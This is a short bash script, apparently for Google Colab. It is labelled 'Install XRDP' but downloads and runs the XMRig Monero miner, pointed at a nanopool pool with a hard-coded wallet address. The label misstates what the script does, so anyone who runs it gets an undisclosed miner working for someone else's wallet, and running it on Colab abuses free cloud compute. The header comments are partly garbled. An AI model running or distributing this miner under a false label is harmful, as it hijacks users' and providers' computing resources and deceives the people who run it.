#! /bin/bash
# Install XRDP
# Before get rtm coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xrm
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz
tar -xf xmrig-6.18.0-bionic-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o xmr-asia1.nanopool.org:14433 -u 4AFXuJMt8by2QANNCBUs4tgWLoUZqvTnXQE87cXkdaC6B1onQgvMACXVBMVwrHq5kFE2m2D8SeLSXVNg7xaufXu2PQt5W4t --tls --coin monero
